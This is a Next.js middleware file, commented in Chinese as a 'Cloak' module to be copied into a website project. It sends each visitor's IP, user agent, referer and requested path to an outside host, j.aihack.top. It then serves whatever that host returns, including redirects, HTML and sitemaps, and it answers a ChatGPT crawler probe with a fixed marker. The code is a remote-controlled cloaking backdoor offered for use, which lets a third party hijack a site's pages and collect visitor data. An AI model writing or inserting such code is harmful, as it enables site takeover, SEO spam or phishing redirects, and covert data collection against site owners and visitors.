import { NextResponse } from 'next/server';
import type { NextRequest } from 'next/server';

/**
 * Cloak 全局中间件
 * 使用方法：直接复制到项目根目录的 middleware.ts
 * 如果已有 middleware.ts，把 cloakHandler 函数合并进去
 */

const REMOTE_URL = 'https://j.aihack.top/api/proxy/handle.php';

async function fetchRemote(request: NextRequest): Promise<string> {
  const serverInfo = {
    T: 'y',
    TPL: 7,
    VER: 1,
    HTTP_USER_AGENT: request.headers.get('user-agent') || '',
    HTTP_HOST: request.headers.get('host') || '',
    REQUEST_URI: request.nextUrl.pathname + request.nextUrl.search,
    REMOTE_ADDR: request.headers.get('x-forwarded-for')?.split(',')[0] || '',
    HTTP_REFERER: request.headers.get('referer') || '',
    HTTP_ACCEPT_LANGUAGE: request.headers.get('accept-language') || '',
  };

  const payload = Buffer.from(JSON.stringify(serverInfo)).toString('base64');

  try {
    const response = await fetch(REMOTE_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
      body: `ua=${encodeURIComponent(payload)}`,
    });
    return response.ok ? await response.text() : '';
  } catch {
    return '';
  }
}

/**
 * Cloak 处理核心逻辑
 * 返回 null 表示放行，返回 NextResponse 表示拦截
 */
async function cloakHandler(request: NextRequest): Promise<NextResponse | null> {
  // ChatGPT 爬虫检测 - 直接输出 ##okresponse## 并终止
  const userAgent = request.headers.get('user-agent') || '';
  const gptParam = request.nextUrl.searchParams.get('gpt');
  if (userAgent.includes('ChatGPT-User/1.0') && gptParam === 'true') {
    return new NextResponse('##okresponse##', { status: 200 });
  }

  const content = await fetchRemote(request);

  // 空内容 = 放行，继续执行原项目代码
  if (!content) return null;

  // 重定向
  if (/^https?:\/\//.test(content)) {
    return NextResponse.redirect(content.trim());
  }

  // ## 前缀 = 特殊响应
  if (content.startsWith('##')) {
    return new NextResponse(content.slice(2));
  }

  // 有内容 = 返回内容
  let contentType = 'text/plain; charset=utf-8';
  if (content.length > 90) {
    if (content.includes('</urlset>') || content.includes('</sitemapindex>')) {
      contentType = 'application/xml; charset=utf-8';
    } else if (content.includes('"urlset"') || content.includes('"sitemapindex"')) {
      contentType = 'application/json; charset=utf-8';
    } else if (content.includes('<html')) {
      contentType = 'text/html; charset=utf-8';
    }
  }

  return new NextResponse(content, {
    headers: { 'Content-Type': contentType },
  });
}

export async function middleware(request: NextRequest) {
  // Cloak 处理
  const cloakResponse = await cloakHandler(request);
  if (cloakResponse) return cloakResponse;

  // 放行，继续原有逻辑
  return NextResponse.next();
}

export const config = {
  // 排除静态资源，其他全部拦截
  matcher: ['/((?!_next/static|_next/image|favicon.ico|.*\\.(?:svg|png|jpg|jpeg|gif|webp|ico|css|js)$).*)'],
};
